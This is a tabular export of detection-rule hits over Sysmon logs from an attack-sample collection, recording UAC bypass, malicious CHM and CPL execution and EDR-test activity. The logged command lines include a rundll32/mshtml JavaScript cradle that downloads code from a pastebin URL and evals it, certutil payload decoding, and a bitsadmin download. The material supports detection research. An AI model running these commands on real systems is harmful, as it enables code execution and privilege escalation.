LogonGuid: 747F3D96-D4B4-5D31-0000-0020FF090500
Hashes: SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E
ParentProcessGuid: 747F3D96-D4B8-5D31-0000-0010A8CE0600
ProcessId: 2156
CurrentDirectory: C:\AtomicRedTeam\atomics\T1003\
ProcessGuid: 747F3D96-DDC5-5D31-0000-0010A3414D00
CommandLine: '""C:\Windows\system32\NOTEPAD.EXE"" C:\AtomicRedTeam\atomics\T1003\T1003.md'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x509ff'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-07-19 15:12:05.613
"
2019-07-26T07:39:14.375565+00:00,HH.EXE Execution;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/Sysmon_Exec_CompiledHTML.evtx,1,Microsoft-Windows-Sysmon,1,4348,MSEDGEWIN10,"Image: C:\Windows\hh.exe
RuleName: ''
Description: Microsoft® HTML Help Executable
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: HTML Help
Company: Microsoft Corporation
ParentProcessId: 4940
LogonGuid: 747F3D96-ABD5-5D3A-0000-0020EB990F00
Hashes: SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020,MD5=1CECEE8D02A8E9B19D3A1A65C7A2B249,SHA256=8AB2F9A4CA87575F03F554AEED6C5E0D7692FA9B5D420008A1521F7F7BD2D0A5,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C
ParentProcessGuid: 747F3D96-ABD7-5D3A-0000-001012661000
ProcessId: 1504
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-AE22-5D3A-0000-001096B24E00
CommandLine: '""C:\Windows\hh.exe"" C:\Users\IEUser\Desktop\Fax Record N104F.chm'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0xf99eb'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-07-26 07:39:14.345
"
2019-07-26T07:39:14.935857+00:00,HTML Help HH.EXE Suspicious Child Process;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;LOL-Binary Copied From System Directory;Mshtml.DLL RunHTMLApplication Suspicious Usage;Potentially Suspicious CMD Shell Output Redirect;Usage Of Web Request Commands And Cmdlets;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/Execution/Sysmon_Exec_CompiledHTML.evtx,1,Microsoft-Windows-Sysmon,1,4353,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\hh.exe"" C:\Users\IEUser\Desktop\Fax Record N104F.chm'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1504
LogonGuid: 747F3D96-ABD5-5D3A-0000-0020EB990F00
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-AE22-5D3A-0000-001096B24E00
ProcessId: 5548
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-AE22-5D3A-0000-001004D84E00
CommandLine: '""C:\Windows\System32\cmd.exe"" /c copy /Y C:\Windows\system32\rundll32.exe %%TEMP%%\out.exe > nul && %%TEMP%%\out.exe javascript:""\..\mshtml RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WinHttp.WinHttpRequest.5.1"");h.Open(""GET"",""http://pastebin.com/raw/y2CjnRtH"",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im out.exe"",0,true);}'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0xf99eb'
IntegrityLevel: Medium
ParentImage: C:\Windows\hh.exe
UtcTime: 2019-07-26 07:39:14.853
"
2019-07-27T22:43:41.424255+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,1,4723,MSEDGEWIN10,"Image: C:\Users\IEUser\Downloads\UACBypass.exe
RuleName: ''
Description: '?'
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: '?'
Company: '?'
ParentProcessId: 4536
LogonGuid: 747F3D96-D21D-5D3C-0000-0020DD5C2300
Hashes: SHA1=23434874C017F3987BA5FD7B9ABB5FCCF1D62231,MD5=4C2E8A86ADAF45774C0A0CB52F25C04B,SHA256=81C898300A19FD8F92297E4BE8BEC8C43E9420B42E93167D375FA1512654EA23,IMPHASH=1A0963EBB2F7EC4A6BDCCD537C92C853
ParentProcessGuid: 747F3D96-D21F-5D3C-0000-0010531C2400
ProcessId: 6632
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 747F3D96-D39D-5D3C-0000-001026F55500
CommandLine: '""C:\Users\IEUser\Downloads\UACBypass.exe"" '
FileVersion: '?'
User: MSEDGEWIN10\IEUser
LogonId: '0x235cdd'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-07-27 22:43:41.388
"
2019-07-27T22:43:41.755406+00:00,Suspicious Double Extension Files,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,11,4725,MSEDGEWIN10,"ProcessGuid: 747F3D96-D39D-5D3C-0000-001026F55500
CreationUtcTime: 2019-07-27 22:43:41.627
UtcTime: 2019-07-27 22:43:41.627
ProcessId: 6632
RuleName: ProvEsc - UAC Bypass Mocking Trusted WinFolders
TargetFilename: C:\Windows \System32\winSAT.exe
Image: C:\Users\IEUser\Downloads\UACBypass.exe
"
2019-07-27T22:43:41.757216+00:00,DLL Search Order Hijackig Via Additional Space in Path,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,11,4726,MSEDGEWIN10,"ProcessGuid: 747F3D96-D39D-5D3C-0000-001026F55500
CreationUtcTime: 2019-07-27 22:43:41.641
UtcTime: 2019-07-27 22:43:41.641
ProcessId: 6632
RuleName: ProvEsc - UAC Bypass Mocking Trusted WinFolders
TargetFilename: C:\Windows \System32\WINMM.dll
Image: C:\Users\IEUser\Downloads\UACBypass.exe
"
2019-07-27T22:43:42.033042+00:00,Hacktool - EDR-Freeze Execution;TrustedPath UAC Bypass Pattern,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,1,4727,MSEDGEWIN10,"Image: C:\Windows \System32\winSAT.exe
RuleName: PrivEsc - UACBypass Mocking Trusted WinFolders
Description: Windows System Assessment Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\UACBypass.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6632
LogonGuid: 747F3D96-D21D-5D3C-0000-0020DD5C2300
Hashes: SHA1=C6B8FDB2ED8FA8A20CD7348E221A18443EF8510B,MD5=BA2ED9D3420FC7F43CB0E535AE8A042C,SHA256=5BD1CD3B86A26DE22ED2C6CDD552C0DAD499B2F1BA1E5A85AF2FB78CFF5D502A,IMPHASH=6F82B876C4C1039B7980A9F0C8B57991
ParentProcessGuid: 747F3D96-D39D-5D3C-0000-001026F55500
ProcessId: 7128
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 747F3D96-D39D-5D3C-0000-0010131E5600
CommandLine: '""C:\Windows \System32\winSAT.exe"" formal'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x235cdd'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Downloads\UACBypass.exe
UtcTime: 2019-07-27 22:43:41.972
"
2019-07-27T22:43:42.161809+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,1,4729,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6820
LogonGuid: 747F3D96-503D-5D3D-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-D231-5D3C-0000-00107E1D2900
ProcessId: 4028
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-D39E-5D3C-0000-0010EF395600
CommandLine: consent.exe 6820 324 0000022557280720
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-07-27 22:43:42.159
"
2019-07-27T22:43:42.392880+00:00,Hacktool - EDR-Freeze Execution;TrustedPath UAC Bypass Pattern;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,1,4730,MSEDGEWIN10,"Image: C:\Windows \System32\winSAT.exe
RuleName: PrivEsc - UACBypass Mocking Trusted WinFolders
Description: Windows System Assessment Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\UACBypass.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6632
LogonGuid: 747F3D96-D21D-5D3C-0000-0020EE5B2300
Hashes: SHA1=C6B8FDB2ED8FA8A20CD7348E221A18443EF8510B,MD5=BA2ED9D3420FC7F43CB0E535AE8A042C,SHA256=5BD1CD3B86A26DE22ED2C6CDD552C0DAD499B2F1BA1E5A85AF2FB78CFF5D502A,IMPHASH=6F82B876C4C1039B7980A9F0C8B57991
ParentProcessGuid: 747F3D96-D39D-5D3C-0000-001026F55500
ProcessId: 3904
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-D39E-5D3C-0000-0010805A5600
CommandLine: '""C:\Windows \System32\winSAT.exe"" formal'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x235bee'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\UACBypass.exe
UtcTime: 2019-07-27 22:43:42.354
"
2019-07-27T22:43:43.016956+00:00,Potential System DLL Sideloading From Non System Locations;Trusted Path Bypass via Windows Directory Spoofing,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx,1,Microsoft-Windows-Sysmon,7,4732,MSEDGEWIN10,"Image: C:\Windows \System32\winSAT.exe
Signature: ''
Hashes: SHA1=7CE46211A5A8D7FE4A767E12BD80769673FDAEE5,MD5=7F8A2B842948EB70133FA34F0CFE772B,SHA256=078CA38607F24FD21A563FA5189843734677B98D5017D5EBB03B2960053B25B5,IMPHASH=14E2B78EE82AD03FAC47525FEDDCA7E6
RuleName: PrivEsc - UACBypass Mocking Trusted WinFolders
Description: '?'
ProcessId: 3904
SignatureStatus: Unavailable
ProcessGuid: 747F3D96-D39E-5D3C-0000-0010805A5600
Signed: 'false'
FileVersion: '?'
ImageLoaded: C:\Windows \System32\WINMM.dll
Product: '?'
Company: '?'
UtcTime: 2019-07-27 22:43:42.661
"
2019-07-29T21:11:11.156704+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_1_11_rundll32_cpl_ostap.evtx,1,Microsoft-Windows-Sysmon,11,4860,MSEDGEWIN10,"ProcessGuid: 747F3D96-6056-5D3F-0000-0010C9EF4100
CreationUtcTime: 2019-07-29 21:09:48.910
UtcTime: 2019-07-29 21:11:11.127
ProcessId: 4600
RuleName: ''
TargetFilename: C:\Users\IEUser\Downloads\Invoice@0582.cpl
Image: C:\Windows\Explorer.EXE
"
2019-07-29T21:11:17.364511+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_1_11_rundll32_cpl_ostap.evtx,1,Microsoft-Windows-Sysmon,1,4861,MSEDGEWIN10,"Image: C:\Windows\System32\control.exe
RuleName: ''
Description: Windows Control Panel
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4600
LogonGuid: 747F3D96-6053-5D3F-0000-0020B5314100
Hashes: SHA1=391FF1F690C0912C217B3CF625900D4F50128867,MD5=88EA810385F455C74306D71C4879C61C,SHA256=4774A931C9D97828323C9E829917D82C27A05DAB9FEA6A0CEF9EBBA59942231F,IMPHASH=7A8EC2645C24D85DE8216D63022623C0
ParentProcessGuid: 747F3D96-6056-5D3F-0000-0010C9EF4100
ProcessId: 4996
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 747F3D96-60F5-5D3F-0000-0010A7B65500
CommandLine: '""C:\Windows\System32\control.exe"" ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x4131b5'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-07-29 21:11:17.256
"
2019-07-29T21:11:17.587732+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Shell32 DLL Execution in Suspicious Directory,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_1_11_rundll32_cpl_ostap.evtx,1,Microsoft-Windows-Sysmon,1,4863,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\control.exe"" ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4996
LogonGuid: 747F3D96-6053-5D3F-0000-0020B5314100
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-60F5-5D3F-0000-0010A7B65500
ProcessId: 4356
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 747F3D96-60F5-5D3F-0000-0010D1CF5500
CommandLine: '""C:\Windows\system32\rundll32.exe"" Shell32.dll,Control_RunDLL ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x4131b5'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\control.exe
UtcTime: 2019-07-29 21:11:17.445
"
2019-07-29T21:11:17.621241+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_1_11_rundll32_cpl_ostap.evtx,1,Microsoft-Windows-Sysmon,1,4864,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\rundll32.exe"" Shell32.dll,Control_RunDLL ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4356
LogonGuid: 747F3D96-6053-5D3F-0000-0020B5314100
Hashes: SHA1=6778DAD71C8B06264CF2929A5242D2612D3EB026,MD5=2F633406BC9875AA48D6CC5884B70862,SHA256=26E68D4381774A6FD0BF5CA2EACEF55F2AB28536E3176A1C6362DFFC68B22B8A,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B
ParentProcessGuid: 747F3D96-60F5-5D3F-0000-0010D1CF5500
ProcessId: 4884
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 747F3D96-60F5-5D3F-0000-0010A8D75500
CommandLine: '""C:\Windows\SysWOW64\rundll32.exe"" ""C:\Windows\SysWOW64\shell32.dll"",#44 ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x4131b5'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2019-07-29 21:11:17.503
"
2019-07-29T21:11:19.098105+00:00,Cscript/Wscript Uncommon Script Extension Execution;Hacktool - EDR-Freeze Execution;Script Interpreter Execution From Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_1_11_rundll32_cpl_ostap.evtx,1,Microsoft-Windows-Sysmon,1,4865,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\wscript.exe
RuleName: ''
Description: Microsoft ® Windows Based Script Host
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\SysWOW64\rundll32.exe"" ""C:\Windows\SysWOW64\shell32.dll"",#44 ""C:\Users\IEUser\Downloads\Invoice@0582.cpl"",'
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 4884
LogonGuid: 747F3D96-6053-5D3F-0000-0020B5314100
Hashes: SHA1=5D7F2AFD2FF69D379B69DD94033B51EC537E8E52,MD5=F2748908C6B873CB1970DF4C07223E72,SHA256=0FBB4F848D9FB14D7BF81B0454203810869C527C3435E8747A2213DD86F8129A,IMPHASH=3602F3C025378F418F804C5D183603FE
ParentProcessGuid: 747F3D96-60F5-5D3F-0000-0010A8D75500
ProcessId: 6160
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\
ProcessGuid: 747F3D96-60F7-5D3F-0000-00106F2F5600
CommandLine: '""C:\Windows\System32\wscript.exe"" /e:JScript.Encode /nologo C:\Users\IEUser\AppData\Local\Temp\info.txt'
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x4131b5'
IntegrityLevel: Medium
ParentImage: C:\Windows\SysWOW64\rundll32.exe
UtcTime: 2019-07-29 21:11:19.010
"
2019-07-29T21:32:55.583667+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4886,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6336
LogonGuid: 747F3D96-DCFC-5D3F-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-60BA-5D3F-0000-001083084F00
ProcessId: 6424
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6607-5D3F-0000-0010B3818500
CommandLine: consent.exe 6336 362 00000298E04230D0
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-07-29 21:32:55.535
"
2019-07-29T21:32:57.633157+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4887,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4600
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6056-5D3F-0000-0010C9EF4100
ProcessId: 1208
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
CommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-07-29 21:32:57.600
"
2019-07-29T21:32:58.659405+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4888,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3184
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660A-5D3F-0000-0010B9E08500
CommandLine: 'cmd  /c certutil -f -decode fi.b64 AllTheThings.dll '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:32:58.614
"
2019-07-29T21:32:58.711831+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4889,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2576
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660A-5D3F-0000-001048E58500
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:32:58.701
"
2019-07-29T21:32:59.234755+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4890,MSEDGEWIN10,"Image: C:\Windows\System32\certutil.exe
RuleName: ''
Description: CertUtil.exe
TerminalSessionId: 1
ParentCommandLine: 'cmd  /c certutil -f -decode fi.b64 AllTheThings.dll '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3184
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=459D928381CDDFDC31D03C3DA5C28E63B1190194,MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4
ParentProcessGuid: 747F3D96-660A-5D3F-0000-0010B9E08500
ProcessId: 700
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660A-5D3F-0000-0010FFF28500
CommandLine: 'certutil  -f -decode fi.b64 AllTheThings.dll '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:32:58.940
"
2019-07-29T21:32:59.582599+00:00,Legitimate Application Dropped Executable;Legitimate Application Writing Files In Uncommon Location,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,11,4891,MSEDGEWIN10,"ProcessGuid: 747F3D96-660A-5D3F-0000-0010FFF28500
CreationUtcTime: 2019-07-29 21:32:59.193
UtcTime: 2019-07-29 21:32:59.209
ProcessId: 700
RuleName: ''
TargetFilename: C:\Windows\System32\AllTheThings.dll
Image: C:\Windows\system32\certutil.exe
"
2019-07-29T21:33:03.193387+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4892,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6020
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-660F-5D3F-0000-00109B328600
CommandLine: cmd  /c bitsadmin.exe /transfer ""JobName"" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt ""C:\Windows\system32\Default_File_Path.ps1""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:03.184
"
